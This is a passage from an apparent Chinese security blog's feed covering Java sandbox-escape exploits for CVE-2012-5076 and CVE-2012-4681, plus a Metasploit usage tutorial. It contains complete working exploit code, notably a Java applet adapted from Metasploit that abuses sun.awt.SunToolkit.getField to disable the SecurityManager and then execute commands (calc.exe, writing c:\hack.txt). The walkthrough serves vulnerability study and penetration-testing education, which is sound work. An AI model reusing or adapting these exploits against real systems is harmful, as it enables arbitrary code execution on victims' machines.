class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">//transform class file to byte array</span></span><br><span class="line">      ByteArrayOutputStream outStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">      <span class="keyword">byte</span>[] bArr = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</span><br><span class="line">      InputStream inStream = getClass().getResourceAsStream(<span class="string">"MyPayload.class"</span>);</span><br><span class="line">      <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span>((len=inStream.<span class="keyword">read</span>(bArr)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        outStream.<span class="keyword">write</span>(bArr, <span class="number">0</span>, len);</span><br><span class="line">      &#125;</span><br><span class="line">      bArr = outStream.toByteArray();</span><br><span class="line">      <span class="comment">//create classloader object</span></span><br><span class="line">      GenericConstructor gc = <span class="keyword">new</span> GenericConstructor(Object.<span class="keyword">class</span>, <span class="string">"sun.invoke.anon.AnonymousClassLoader"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[<span class="number">0</span>]);</span><br><span class="line">      Object obj = gc.create(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">      <span class="comment">//call loadclass method to load byte array</span></span><br><span class="line">      Method md = ManagedObjectManagerFactory.getMethod(obj.getClass(), <span class="string">"loadClass"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[]&#123;<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>].getClass()&#125;);</span><br><span class="line">      <span class="keyword">Class</span> cls = (<span class="keyword">Class</span>)md.invoke(obj, <span class="keyword">new</span> Object[]&#123;bArr&#125;);</span><br><span class="line">      <span class="comment">//instance MyPayload class to set SecurityManager=null</span></span><br><span class="line">      cls.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> setPayload() <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="keyword">Runtime</span>.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>CVE-2012-5076一个是Java API层的漏洞，通过利用缺陷API间接调用Bootstrap Classloader来加载自定义的提权类，从而绕过JRE Sandbox的限制。该漏洞影响范围是JRE7U0-JRE7U7。]]>
    
    </summary>
    
      <category term="Java CVE" scheme="https://github.com/liteway/liteway.github.io/tags/Java-CVE/"/>
    
      <category term="漏洞分析" scheme="https://github.com/liteway/liteway.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java Exploit分析之CVE-2012-4681]]></title>
    <link href="https://github.com/liteway/liteway.github.io/2014/09/14/java_cve_2012_4681/"/>
    <id>https://github.com/liteway/liteway.github.io/2014/09/14/java_cve_2012_4681/</id>
    <published>2014-09-14T15:26:26.000Z</published>
    <updated>2015-08-08T08:34:38.000Z</updated>
    <content type="html"><![CDATA[<p>CVE-2012-4681一个是Java API层的漏洞，通过利用sun.awt.SunToolkit类中的getField方法来间接绕过SecurityManager的限制，从而绕过JRE Sandbox。该漏洞影响范围是JRE7U6以前的版本。<a id="more"></a></p>
<h2 id="缺陷API">缺陷API</h2><p>该漏洞的缺陷API位于sun.awt.SunToolkit类中的getField方法，该方法在doPrivileged块中调用反射API-getDeclaredField()方法，并通过setAccessible将field（无论公有或私有）设置为可访问的，以此可以绕过栈检查，并得到修改访问权限后的field对象。该缺陷方法伪代码如下：<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function">Field <span class="title">getField</span><span class="params">(class_obj, field_str)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">return</span> AccessController.<span class="title">doPrivileged</span><span class="params">(</span><br><span class="line">    <span class="keyword">new</span> PrivilegedAction()</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="function">Field <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Field f = class_obj.getDeclaredField(field_str);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过利用getField方法，我们可以获取java.beans.Statement的私有域acc(AccessControlContext对象)，从而可以利用反射设置该acc域的值为自定义权限。</p>
<h2 id="详细利用分析">详细利用分析</h2><h3 id="1-_访问sun-awt-SunToolkit类">1. 访问sun.awt.SunToolkit类</h3><p>由于sun包在JRE的限制访问包列表中，不能直接访问sun中的类，这里借助java.beans.Expression类间接调用Class.forName来访问SunToolkit类。<br>Expression类的构造函数可以用来调用类的静态方法，其构造函数的3个参数以此为：类、静态方法名、方法参数，访问代码如下：<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Expression <span class="built_in">exp</span> = new Expression<span class="params">(Class.class, <span class="string">"forName"</span>, new Object[]&#123;<span class="string">"sun.awt.SunToolkit"</span>&#125;)</span>;</span><br><span class="line"><span class="built_in">exp</span>.execute<span class="params">()</span>;</span><br><span class="line"><span class="comment">//stk_cls即为SunToolkit类</span></span><br><span class="line">Class stk_cls = <span class="params">(Class)</span><span class="built_in">exp</span>.getValue<span class="params">()</span>;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-_调用getField方法">2. 调用getField方法</h3><p>既然Expression这么强大，而且SunToolKit类中的getField方法也是静态方法，我们依然可以构造Expression来访问该方法。利用该方法我们来获取某个类的Field对象后，就可以设置其对应实例的Field值为任意值：<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Expression ex<span class="variable">p2</span> =<span class="instruction"> new </span>Expression(stk_cls, <span class="string">"getField"</span>,<span class="instruction"> new </span>Object<span class="keyword">[</span>]&#123;class_obj, field_str&#125;<span class="function">)</span>;</span><br><span class="line">ex<span class="variable">p2</span>.execute(<span class="function">)</span>;</span><br><span class="line">//set<span class="instruction"> instance </span>object's field = field_value</span><br><span class="line">((Field<span class="function">)</span>ex<span class="variable">p2</span>.getValue(<span class="function">)</span><span class="function">)</span>.set(instance_obj, field_value<span class="function">)</span>;</span><br></pre></td></tr></table></figure></p>
<h3 id="3-_Disable_SecurityManager">3. Disable SecurityManager</h3><p>我们的目标是能够在当前Context中设置SecurityManager为null，然后我们的shellcode就可以在JRE上大行其道，直接设置肯定是不允许的，所以我们首先要构造一个可以执行这个操作的Context。<br>通过源码可以发现Expression的父类java.beans.Statement存在着这样一个Context(AccessControlContext对象acc)，利用前面介绍的getField方法就可以设置当前的acc域的值为任意值，这个任意值我们设置为具有AllPermission权限的Context，再在这个Context上去disable SecurityManager，这里依然使用Statement表达式间接调用setSecurityManager方法。代码如下：<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Statement st = <span class="keyword">new</span> Statement(System.<span class="keyword">class</span>, <span class="string">"setSecurityManager"</span>, <span class="keyword">new</span> <span class="built_in">Object</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">final</span> Permissions ps = <span class="keyword">new</span> Permissions();</span><br><span class="line">ps.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line">ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">new</span> URL(<span class="string">"file:////"</span>), <span class="keyword">new</span> Certificate[<span class="number">0</span>]), ps);</span><br><span class="line">AccessControlContext new_acc = <span class="keyword">new</span> AccessControlContext(<span class="keyword">new</span> ProtectionDomain[]&#123;pd&#125;);</span><br><span class="line"><span class="comment">//call Field Object from getField to set acc</span></span><br><span class="line">((Field)exp2.getValue()).<span class="literal">set</span>(st, new_acc);</span><br><span class="line">st.execute();</span><br></pre></td></tr></table></figure></p>
<h3 id="4-_POC参考代码">4. POC参考代码</h3><p>CVE-2012-4681的Exploit代码如下（参考Metasploit）：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.applet.Applet;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.beans.Expression;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.beans.Statement;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.io.FileWriter;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.lang.reflect.Field;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.net.URL;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.AccessControlContext;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.AllPermission;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.CodeSource;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.Permissions;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.ProtectionDomain;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.cert.Certificate;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//CVE-2012-4681 POC</span></span><br><span class="line"><span class="comment">//use reflection API to set current Statement.acc=allpermission, and disable securitymanager</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">extends</span> <span class="title">Applet</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> init()&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">//disable securitymanager</span></span><br><span class="line">      <span class="keyword">this</span>.disableSecurity();</span><br><span class="line">      <span class="comment">//set payload and execute arbitrary code</span></span><br><span class="line">      <span class="keyword">this</span>.setPayload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable t)&#123;</span><br><span class="line">      t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//get class object with reflection</span></span><br><span class="line">  <span class="keyword">private</span> Class getClass(<span class="keyword">final</span> String s) throws Throwable &#123;</span><br><span class="line">    <span class="keyword">final</span> Expression express = <span class="keyword">new</span> Expression(Class.<span class="keyword">class</span>, <span class="string">"forName"</span>, <span class="keyword">new</span> Object[]&#123;s&#125;);</span><br><span class="line">    express.execute();</span><br><span class="line">    <span class="keyword">return</span> (Class)express.getValue();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//call sun's getField func(can get any field of any class), set object o's field s=o1</span></span><br><span class="line">  <span class="comment">//sun package is not allowed to access directly, use getClass reflect method to access</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> setField(<span class="keyword">final</span> Class cls, <span class="keyword">final</span> String s, <span class="keyword">final</span> Object o, <span class="keyword">final</span> Object o1) throws Throwable &#123;</span><br><span class="line">    <span class="keyword">final</span> Expression express = <span class="keyword">new</span> Expression(<span class="keyword">this</span>.getClass(<span class="string">"sun.awt.SunToolkit"</span>), <span class="string">"getField"</span>, <span class="keyword">new</span> Object[]&#123;cls, s&#125;);</span><br><span class="line">    express.execute();</span><br><span class="line">    ((Field)express.getValue()).<span class="keyword">set</span>(o, o1);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> disableSecurity() throws Throwable &#123;</span><br><span class="line">    <span class="comment">//initial argument is null</span></span><br><span class="line">    <span class="keyword">final</span> Statement st = <span class="keyword">new</span> Statement(System.<span class="keyword">class</span>, <span class="string">"setSecurityManager"</span>, <span class="keyword">new</span> Object[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">final</span> Permissions ps = <span class="keyword">new</span> Permissions();</span><br><span class="line">    ps.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line">    ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">new</span> URL(<span class="string">"file:////"</span>), <span class="keyword">new</span> Certificate[<span class="number">0</span>]), ps);</span><br><span class="line">    AccessControlContext new_acc = <span class="keyword">new</span> AccessControlContext(<span class="keyword">new</span> ProtectionDomain[]&#123;pd&#125;);</span><br><span class="line">    <span class="comment">//set st's AccessControlContext property=user_defined all permission value</span></span><br><span class="line">    <span class="keyword">this</span>.setField(Statement.<span class="keyword">class</span>, <span class="string">"acc"</span>, st, new_acc);</span><br><span class="line">    <span class="comment">//call st's method to set securitymanger=null</span></span><br><span class="line">    st.execute();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> setPayload() throws Throwable &#123;</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    FileWriter fw = <span class="keyword">new</span> FileWriter(<span class="string">"c:\\hack.txt"</span>);</span><br><span class="line">    fw.write(<span class="string">"hello, hacking success"</span>);</span><br><span class="line">    fw.close();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>CVE-2012-4681一个是Java API层的漏洞，通过利用sun.awt.SunToolkit类中的getField方法来间接绕过SecurityManager的限制，从而绕过JRE Sandbox。该漏洞影响范围是JRE7U6以前的版本。]]>
    
    </summary>
    
      <category term="Java CVE" scheme="https://github.com/liteway/liteway.github.io/tags/Java-CVE/"/>
    
      <category term="漏洞分析" scheme="https://github.com/liteway/liteway.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[从你的全世界路过之Metasploit]]></title>
    <link href="https://github.com/liteway/liteway.github.io/2014/08/28/metasploit_usage/"/>
    <id>https://github.com/liteway/liteway.github.io/2014/08/28/metasploit_usage/</id>
    <published>2014-08-28T15:26:26.000Z</published>
    <updated>2015-08-08T08:33:56.000Z</updated>
    <content type="html"><![CDATA[<p>工欲善其事，必先利其器。对于安全研究者来说，Metasploit是一款渗透测试的利器，正如其官方宣称的那样（World’s most used penetration testing software），它的锋利足以承载它的梦想！本文将以一个IE Exploit的例子来带你路过Metasploit的世界。<a id="more"></a></p>
<h2 id="Metasploit是什么">Metasploit是什么</h2><p>Metasploit是一个模拟作战平台，平台之上提供了从侦查（漏洞扫描）到攻击（Exploit），再到屠城（Payload）等一系列的武器装备，当然这些装备并不全是免费的，可以根据需求在<a href="http://www.metasploit.com/" target="_blank" rel="external">Metasploit官网</a>上购买不同等级的装备。对于一般的研究者来说，其提供的开源的<strong>Metasploit Framework</strong>足以。</p>
<p>Metasploit Framework（MSF）的最大贡献在于将漏洞利用技术从传统的手工作坊推进到现代化工业生产，用户可以根据需求自由组装合适自己的武器装备。MSF中收集了许多不同种类的Exploit和Payload，每种Exploit有多种Payload可以选择，就像每种枪都可以选择不同威力的子弹一样。</p>
<p>本文以演习的标准选择一个空包弹，在IE Exploit成功后弹出计算器，以示在敌方阵地插上小红旗。</p>
<h2 id="Metasploit环境准备">Metasploit环境准备</h2><p>在<a href="http://www.rapid7.com/products/metasploit/download.jsp" target="_blank" rel="external">这里</a>可以选择下载Windows版或者Linux版的Metasploit Framework，运行二进制安装文件可以直接在界面中进行配置。</p>
<p>本文实验环境：<br>服务端：CentOS Metasploit Framework(Linux版)<br>执行命令：</p>
<ol>
<li><strong>cd /opt/metasploit/apps/pro/msf3/</strong></li>
<li><strong>msfconsole</strong> （每次都会看到不同的酷炫Logo，逗比的Metasploit Developer）<br><img src="/img/metasploit_usage/msf_main.jpg" alt=""><br>在msf3/modules目录下包含了MSF中所用到的各种exploit、payload以及一些辅助模块</li>
</ol>
<p>客户端：选择靶机中的战斗机 WinXP-SP3 + IE8</p>
<h2 id="Metasploit命令介绍">Metasploit命令介绍</h2><p>在msfconsole中提供了大量的命令，下面列出了一些常用的命令（MSF中的命令区分大小写）：</p>
<blockquote>
<p><strong>管理命令</strong>：<br>  <strong>help [cmd]</strong>: 显示命令的帮助信息<br>  [如：help search 查看search命令的用法]<br>  <strong>search [cond]</strong>: 根据name或cve等信息查找的module<br>  [如：search name:ms13 查找微软2013年的Exploit]<br>  <strong>info [module]</strong>: 显示指定module的所有信息<br>  [如：info exploit/windows/browser/ms13_080_cdisplaypointer]<br>  <strong>jobs [options]</strong>: 管理后台运行的所有module的状态<br>  [如：jobs -K 终止所有运行的job，<br>       jobs -l 列出所有运行的job信息]<br>  <strong>kill [job_id]</strong>: 结束指定id的job，常用jobs -l先列出所有job id，再kill指定job<br>  <strong>sessions [options]</strong>: 管理当前exploit执行成功后开启的session(shell, meterpreter, etc)<br>  [如：sessions -K 终止当前连接的所有session，<br>       sessions -l 列出当前活着的session信息，<br>       sessions -i id 与当前session id进行交互]<br>  <strong>exit</strong>: 退出msfconsole</p>
<p><strong>配置命令</strong>：<br>  <strong>use [module]</strong>: 选择某个exploit module，切换到该module的上下文<br>  [如：use exploit/windows/browser/ms13_080_cdisplaypointer]<br>  <strong>back</strong>: 从当前上下文返回<br>  <strong>set [option] [value]</strong>: 设置指定option的值<br>  <strong>unset [option]</strong>: 取消当前option的设定<br>  <strong>setg [option] [value]</strong>: 设置指定option的全局值，省去了重复设置的麻烦<br>  <strong>unsetg [option]</strong>: 取消当前option的全局设定<br>  [如：set SRVHOST 192.168.1.2 设置服务器端IP地址]<br>  <strong>show [argument]</strong>: 显示指定参数的信息<br>  [如：show options 显示当前设置的所有信息，<br>       show exploits 显示MSF中所有的exploit，<br>       show payloads 显示当前可用的所有payload，<br>       show targets 显示当前可攻击的目标平台]<br>  <strong>exploit</strong>: 激活当前配置的exploit module，主动发起攻击或被动等待连接<br>  <strong>exploit -j</strong>: 激活当前exploit并进入后台运行<br>  <strong>resource [rc_file]</strong>: 用户可以将所有的配置命令写到一个配置文件中(test.rc)，执行此命令则会自动加载所有配置<br>  [在msfconsole后指定rc文件作为参数(msfconsole -r test.rc)也可以自动加载配置文件]</p>
</blockquote>
<h2 id="Metasploit攻击实战">Metasploit攻击实战</h2><p>Metasploit Server端配置：<br><img src="/img/metasploit_usage/msf_server.jpg" alt=""></p>
<p>客户端中招弹出计算器：<br><img src="/img/metasploit_usage/msf_client.jpg" alt=""></p>
<p>至此，本文对Metasploit的介绍已经结束，管中窥豹，略见一斑，有兴趣的用户可以进一步探寻更高端的meterpreter的世界！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>工欲善其事，必先利其器。对于安全研究者来说，Metasploit是一款渗透测试的利器，正如其官方宣称的那样（World’s most used penetration testing software），它的锋利足以承载它的梦想！本文将以一个IE Exploit的例子来带你路过Metasploit的世界。]]>
    
    </summary>
    
      <category term="Metasploit" scheme="https://github.com/liteway/liteway.github.io/tags/Metasploit/"/>
    
      <category term="渗透测试" scheme="https://github.com/liteway/liteway.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>